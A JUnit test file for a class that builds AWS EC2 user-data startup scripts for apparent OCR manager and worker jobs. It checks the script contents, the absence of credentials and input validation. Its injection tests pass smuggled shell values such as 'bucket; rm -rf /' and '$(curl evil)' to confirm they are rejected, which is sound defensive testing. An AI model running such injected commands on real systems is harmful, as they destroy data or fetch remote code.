package com.distributedsystems.aws;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import org.junit.jupiter.api.Test;

class UserDataTest {

    @Test
    void workerScriptDownloadsJarAndStartsItWithIdleShutdown() {
        String script = UserData.worker("my-bucket", "jars/worker.jar");

        assertTrue(script.startsWith("#!/bin/bash\n"), "must start with a shebang line");
        assertTrue(script.contains("/snap/bin/aws s3 cp s3://my-bucket/jars/worker.jar /opt/ocr/worker.jar"));
        assertTrue(script.contains("export IDLE_SHUTDOWN_MINUTES=" + UserData.WORKER_IDLE_SHUTDOWN_MINUTES + "\n"));
        assertTrue(script.contains("nohup java -jar /opt/ocr/worker.jar >> /var/log/worker.log 2>&1 &"));
    }

    @Test
    void managerScriptPassesBucketAndWorkerAmiIdWithoutIdleShutdown() {
        String script = UserData.manager("my-bucket", "jars/manager.jar", "ami-07f5ffe53445e23b1");

        assertTrue(script.contains("/snap/bin/aws s3 cp s3://my-bucket/jars/manager.jar /opt/ocr/manager.jar"));
        assertFalse(script.contains("IDLE_SHUTDOWN_MINUTES"), "manager must not self-shutdown on idle");
        // ManagerMain reads args[0] = bucket, args[1] = worker AMI ID
        assertTrue(script.contains(
                "nohup java -jar /opt/ocr/manager.jar my-bucket ami-07f5ffe53445e23b1 >> /var/log/manager.log 2>&1 &"));
    }

    @Test
    void managerScriptRejectsUnsafeAmiId() {
        assertThrows(IllegalArgumentException.class,
                () -> UserData.manager("my-bucket", "jars/manager.jar", "ami-1; reboot"));
        assertThrows(IllegalArgumentException.class, () -> UserData.manager("my-bucket", "jars/manager.jar", null));
    }

    @Test
    void scriptContainsNoCredentials() {
        String script = UserData.worker("my-bucket", "jars/worker.jar").toLowerCase();

        assertFalse(script.contains("aws_access_key_id"));
        assertFalse(script.contains("aws_secret_access_key"));
        assertFalse(script.contains("aws_session_token"));
    }

    @Test
    void rejectsValuesThatCouldInjectShellCommands() {
        assertThrows(IllegalArgumentException.class, () -> UserData.worker("bucket; rm -rf /", "jars/worker.jar"));
        assertThrows(IllegalArgumentException.class, () -> UserData.worker("bucket", "$(curl evil)"));
        assertThrows(IllegalArgumentException.class, () -> UserData.worker(null, "jars/worker.jar"));
    }
}